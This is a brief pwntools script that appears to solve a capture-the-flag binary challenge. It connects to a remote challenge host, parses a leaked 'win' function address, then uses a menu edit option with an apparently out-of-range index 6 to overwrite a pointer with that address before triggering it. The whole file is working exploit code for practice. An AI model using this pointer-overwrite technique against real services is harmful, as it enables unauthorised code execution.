from pwn import *

p = remote('pwn-le-sserafim.chals.blahaj.sg', 12923)

p.recvuntil(b'my deepest kpop secret is at ')
win = int(p.recvline().strip()[:-3], 16)
log.info(f"Win address: {hex(win)}")

p.sendlineafter(b'select an option > ', b'2')
p.sendlineafter(b'whose favorite ice cream would you like to edit? > ', b'6')
p.sendlineafter(b'what would you like to edit it to? > ', p64(win))

p.sendlineafter(b'select an option > ', b'3')
p.interactive()